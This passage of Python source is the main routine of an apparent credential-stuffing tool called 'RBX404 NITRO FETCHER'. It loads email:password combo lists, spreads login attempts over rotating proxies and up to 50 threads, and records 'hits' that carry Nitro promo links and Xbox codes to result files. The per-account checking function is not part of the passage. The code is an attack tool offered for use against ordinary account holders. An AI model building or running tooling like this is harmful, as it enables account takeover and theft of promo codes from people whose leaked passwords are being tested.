    combo_path = console.input("[bold cyan]  📂 Combo file path (email:pass) : [/bold cyan]").strip()
    combo_path = combo_path.strip('"').strip("'")

    if not os.path.isfile(combo_path):
        console.print(f"[bold red]  ✗ File not found: {combo_path}[/bold red]")
        input("\n  Press Enter to exit...")
        sys.exit(1)

    # ── Threads ──
    threads_input = console.input("[bold cyan]  🧵 Threads (default 5)          : [/bold cyan]").strip()
    try:
        num_threads = int(threads_input) if threads_input else 5
        num_threads = max(1, min(num_threads, 50))
    except ValueError:
        num_threads = 5

    # ── Proxy ──
    use_proxy = console.input(
        "[bold cyan]  🌐 Use built-in proxies? (y/n)  : [/bold cyan]"
    ).strip().lower()

    use_px = use_proxy in ("y", "yes")

    extra_proxies = []
    if use_px:
        custom = console.input(
            "[bold cyan]  📄 Extra proxy file? (Enter to skip) : [/bold cyan]"
        ).strip().strip('"').strip("'")
        if custom and os.path.isfile(custom):
            with open(custom, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        extra_proxies.append(line)
            console.print(f"[dim]    Loaded {len(extra_proxies)} extra proxies[/dim]")

    # Initialize proxy rotator
    all_proxy_list = BUILTIN_PROXIES.copy() + extra_proxies
    proxy_rotator = ProxyRotator(proxy_list=all_proxy_list, use_proxies=use_px)

    if use_px:
        console.print(
            f"[bold green]  ✓ Proxy pool: {proxy_rotator.get_total_count()} proxies loaded[/bold green]"
        )

    # ── Parse combos ──
    console.print()
    console.print("[bold yellow]  ⏳ Loading combo file...[/bold yellow]")

    combos = []
    with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
        raw_lines = f.readlines()

    stats.total_combos = len(raw_lines)

    for line in raw_lines:
        parsed = parse_combo_line(line)
        if parsed:
            combos.append(parsed)
            stats.valid_lines += 1
        else:
            if line.strip():
                stats.bad_lines += 1

    console.print(f"[bold green]  ✓ Loaded {stats.valid_lines} valid combos[/bold green]")
    console.print(
        f"[dim]    (Skipped {stats.bad_lines} bad lines from {stats.total_combos} total)[/dim]"
    )

    if not combos:
        console.print("[bold red]  ✗ No valid combos found![/bold red]")
        input("\n  Press Enter to exit...")
        sys.exit(1)

    # ── Output dir ──
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    output_dir = os.path.join("results_nitro", f"results_{timestamp}")
    os.makedirs(output_dir, exist_ok=True)

    # ── Confirm ──
    console.print()
    console.print(
        Panel(
            f"[bold white]  Combos  : [cyan]{stats.valid_lines}[/cyan]\n"
            f"  Threads : [cyan]{num_threads}[/cyan]\n"
            f"  Proxies : [cyan]{proxy_rotator.get_total_count() if use_px else 'None'}[/cyan]\n"
            f"  Output  : [cyan]{output_dir}[/cyan][/bold white]",
            title="[bold red]⛩ CONFIG ⛩[/bold red]",
            border_style="red",
            box=box.ROUNDED,
        )
    )
    console.print()
    console.input("[bold white]  Press Enter to start...[/bold white]")

    # ── Clear and run ──
    time.sleep(0.5)
    os.system("cls" if os.name == "nt" else "clear")

    console.print(
        Panel(
            Align.center(
                "[bold red]⛩ RBX404 NITRO FETCHER ⛩[/bold red]\n"
                f"[dim]Threads: {num_threads} | Combos: {len(combos)} | "
                f"Proxies: {proxy_rotator.get_total_count() if use_px else 'None'}[/dim]"
            ),
            border_style="red",
            box=box.DOUBLE_EDGE,
        )
    )
    console.print()

    # Live stats tracker
    last_hit_count = [0]
    print_lock = threading.Lock()

    def print_live_status():
        with print_lock:
            px_info = (
                f"  [dim]🌐 Proxies Active: {proxy_rotator.get_active_count()}/{proxy_rotator.get_total_count()} | "
                f"Proxy Errors: {stats.proxy_errors} | Retries: {stats.retries}[/dim]"
                if use_px
                else ""
            )
            console.print(
                f"  [cyan]📊[/cyan] Checked: [bold]{stats.checked}[/bold]/{stats.valid_lines}"
                f"  [green]🎯[/green] Hits: [bold green]{stats.hits}[/bold green]"
                f"  [yellow]🔒[/yellow] Claimed: [bold yellow]{stats.claimed}[/bold yellow]"
                f"  [red]❌[/red] Invalid: [bold red]{stats.invalid}[/bold red]"
                f"  [magenta]💥[/magenta] Errors: [bold]{stats.errors}[/bold]"
                f"{px_info}",
                highlight=False,
            )

            # Print new hits
            with stats.lock:
                new_hits = stats.hit_results[last_hit_count[0]:]
                last_hit_count[0] = len(stats.hit_results)

            for email, pwd, promo, status in new_hits:
                console.print(
                    Panel(
                        f"[bold green]🎯 HIT FOUND![/bold green]\n"
                        f"[white]{email}:{pwd}[/white]\n"
                        f"[cyan]{promo}[/cyan]\n"
                        f"[yellow]Status: {status}[/yellow]",
                        border_style="green",
                        box=box.ROUNDED,
                    )
                )

    with Progress(
        SpinnerColumn(style="red"),
        TextColumn("[bold white]{task.description}[/bold white]"),
        BarColumn(bar_width=40, style="red", complete_style="green"),
        TextColumn("[bold cyan]{task.completed}/{task.total}[/bold cyan]"),
        TimeElapsedColumn(),
        console=console,
        expand=True,
    ) as progress:

        task = progress.add_task("⛩ Checking accounts...", total=len(combos))

        last_status_time = [0]

        def worker(email, password):
            process_account(email, password, task, progress)
            now = time.time()
            if now - last_status_time[0] >= 3:
                last_status_time[0] = now
                print_live_status()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(worker, e, p) for e, p in combos]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass

    # Final status print
    print_live_status()

    # ── Save ──
    console.print()
    console.print(Rule("[bold red]⛩ SAVING RESULTS ⛩[/bold red]", style="red"))
    save_results(output_dir)
    console.print(f"[bold green]  ✓ Results saved to: {output_dir}[/bold green]")

    # ── Final dashboard ──
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")

    console.print(
        Panel(
            Align.center(BANNER_ART + "\n[bold white]        ⛩  FINAL RESULTS  ⛩[/bold white]"),
            border_style="red",
            box=box.DOUBLE_EDGE,
        )
    )

    # Summary table
    total = max(stats.valid_lines, 1)
    summary = Table(
        title="[bold red]📊 FINAL SUMMARY[/bold red]",
        box=box.DOUBLE_EDGE,
        border_style="red",
        show_header=True,
        header_style="bold magenta",
        expand=True,
        padding=(0, 2),
    )
    summary.add_column("Category", style="cyan", justify="left", width=28)
    summary.add_column("Count", style="bold white", justify="center", width=10)
    summary.add_column("Percentage", style="yellow", justify="center", width=12)

    summary.add_row("📦 Total Combos", str(stats.total_combos), "---")
    summary.add_row("⚠️  Bad Lines (Skipped)", str(stats.bad_lines), "---")
    summary.add_row("✅ Valid Lines", str(stats.valid_lines), "---")
    summary.add_row("", "", "")
    summary.add_row("🔍 Checked", str(stats.checked), f"{stats.checked * 100 // total}%")
    summary.add_row(
        "🎯 Hits (Promo Found)",
        f"[bold green]{stats.hits}[/bold green]",
        f"[bold green]{stats.hits * 100 // total}%[/bold green]",
    )
    summary.add_row(
        "🆓 Unclaimed / No Promo",
        str(stats.unclaimed),
        f"{stats.unclaimed * 100 // total}%",
    )
    summary.add_row(
        "🔒 Already Claimed",
        str(stats.claimed),
        f"{stats.claimed * 100 // total}%",
    )
    summary.add_row(
        "❌ Invalid Accounts",
        f"[red]{stats.invalid}[/red]",
        f"[red]{stats.invalid * 100 // total}%[/red]",
    )
    summary.add_row(
        "💥 Errors",
        f"[red]{stats.errors}[/red]",
        f"[red]{stats.errors * 100 // total}%[/red]",
    )
    summary.add_row("", "", "")
    summary.add_row(
        "🌐 Proxy Errors",
        str(stats.proxy_errors),
        "[dim]---[/dim]",
    )
    summary.add_row(
        "🔄 Total Retries",
        str(stats.retries),
        "[dim]---[/dim]",
    )

    console.print(summary)
    console.print()

    # Hits table
    if stats.hit_results:
        hits_tbl = Table(
            title="[bold green]🎯 ALL HITS[/bold green]",
            box=box.ROUNDED,
            border_style="green",
            show_header=True,
            header_style="bold green",
            expand=True,
        )
        hits_tbl.add_column("#", style="dim", width=5)
        hits_tbl.add_column("Email:Password", style="white", max_width=40)
        hits_tbl.add_column("Promo Link", style="cyan", max_width=55)
        hits_tbl.add_column("Status", style="green", max_width=12)

        for idx, (email, pwd, promo, status) in enumerate(stats.hit_results, 1):
            st = {
                "UNCLAIMED": "[bold green]UNCLAIMED[/bold green]",
                "FOUND": "[bold yellow]FOUND[/bold yellow]",
                "XBOX_CODE": "[bold cyan]XBOX CODE[/bold cyan]",
            }.get(status, f"[white]{status}[/white]")

            hits_tbl.add_row(str(idx), f"{email}:{pwd[:4]}****", promo[:55], st)

        console.print(hits_tbl)
        console.print()

    # Files table
    files_tbl = Table(
        title="[bold cyan]📁 SAVED FILES[/bold cyan]",
        box=box.SIMPLE,
        border_style="cyan",
        show_header=True,
        header_style="bold cyan",
    )
    files_tbl.add_column("File", style="white")
    files_tbl.add_column("Entries", style="yellow", justify="center")

    files_tbl.add_row(f"{output_dir}/hits.txt", str(stats.hits))
    files_tbl.add_row(f"{output_dir}/unclaimed.txt", str(stats.unclaimed))
    files_tbl.add_row(f"{output_dir}/claimed.txt", str(stats.claimed))
    files_tbl.add_row(f"{output_dir}/invalid.txt", str(stats.invalid))
    files_tbl.add_row(f"{output_dir}/errors.txt", str(stats.errors))
    files_tbl.add_row(f"{output_dir}/summary.txt", "1")

    console.print(files_tbl)
    console.print()

    console.print(
        Panel(
            f"[bold green]✓ All results saved to: [cyan]{output_dir}[/cyan][/bold green]",
            border_style="green",
            box=box.ROUNDED,
        )
    )
    console.print()

    console.input("[bold white]  Press Enter to exit... [/bold white]")


if __name__ == "__main__":
    main()
